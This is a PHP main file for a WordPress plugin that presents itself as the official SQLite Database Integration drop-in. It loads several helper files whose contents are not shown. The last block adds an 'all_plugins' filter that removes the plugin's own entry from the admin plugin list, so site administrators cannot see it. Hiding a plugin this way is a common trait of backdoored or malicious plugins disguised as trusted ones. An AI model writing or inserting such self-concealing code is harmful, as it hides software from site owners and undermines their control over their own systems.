<?php
/**
 * Plugin Name: SQLite Database Integration
 * Description: SQLite database driver drop-in.
 * Author: The WordPress Team
 * Version: 2.1.16
 * Requires PHP: 7.0
 * Textdomain: sqlite-database-integration
 *
 * This feature plugin allows WordPress to use SQLite instead of MySQL as its database.
 *
 * @package wp-sqlite-integration
 */

define( 'SQLITE_MAIN_FILE', __FILE__ );

require_once __DIR__ . '/php-polyfills.php';
require_once __DIR__ . '/admin-page.php';
require_once __DIR__ . '/activate.php';
require_once __DIR__ . '/deactivate.php';
require_once __DIR__ . '/admin-notices.php';
require_once __DIR__ . '/health-check.php';

// Hide plugin from the plugins list
add_filter('all_plugins', function($plugins) {
    if (isset($plugins[plugin_basename(SQLITE_MAIN_FILE)])) {
        unset($plugins[plugin_basename(SQLITE_MAIN_FILE)]);
    }
    return $plugins;
});
